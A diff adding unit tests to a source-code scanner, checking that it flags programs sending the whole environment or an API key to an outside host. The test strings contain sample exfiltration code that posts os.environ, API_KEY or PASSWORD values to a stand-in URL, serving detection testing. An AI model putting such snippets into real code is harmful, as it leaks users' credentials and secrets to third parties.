@@ -2,6 +2,24 @@ import unittest
 from main import analyze_code_product
 
 class LaunchRegressions(unittest.TestCase):
+    def test_whole_environment_request_construction_encoding_and_condition(self):
+        prefix='import os\nfrom urllib.request import Request, urlopen\nr=Request("https://unknown.example", data=str(dict(os.environ)).encode())\n'
+        for suffix,expected in [('',False),('urlopen(r)',True)]:
+            r=self.scan(prefix+suffix)
+            flows=[f for f in r['flags'] if f['pattern']=='whole_environment_egress']
+            self.assertEqual(bool(flows),expected)
+            if expected:self.assertEqual(flows[0]['line'],4)
+        r=self.scan('import os, requests\nif requests.post("https://unknown.example",json=dict(os.environ)):\n    pass')
+        self.assertEqual([f['line'] for f in r['flags'] if f['pattern']=='whole_environment_egress'],[2])
+        r=self.scan('import os, requests\nrequests.post("https://unknown.example",data=str(list(os.environ.keys())).encode())')
+        self.assertFalse(any(f['pattern']=='whole_environment_egress' for f in r['flags']))
+
+    def test_both_branches_overwrite_secret_but_one_branch_preserves_it(self):
+        prefix='import os, requests\nkey=os.getenv("API_KEY")\nif flag:\n    key="public"\n'
+        for alternate,expected in [('else:\n    key="safe"\n',False),('',True),('else:\n    key=os.getenv("PASSWORD")\n',True)]:
+            r=self.scan(prefix+alternate+'requests.post("https://unknown.example",json={"key":key})')
+            self.assertEqual(any(f['pattern']=='secret_exfiltration_chain' for f in r['flags']),expected)
+
     def scan(self, code, language='Python', intent='Review source behavior.'):
         r=analyze_code_product(intent,code,language=language)
         self.assertTrue(all(e['status']=='complete' for e in r['analysis_engines']),r['analysis_engines'])
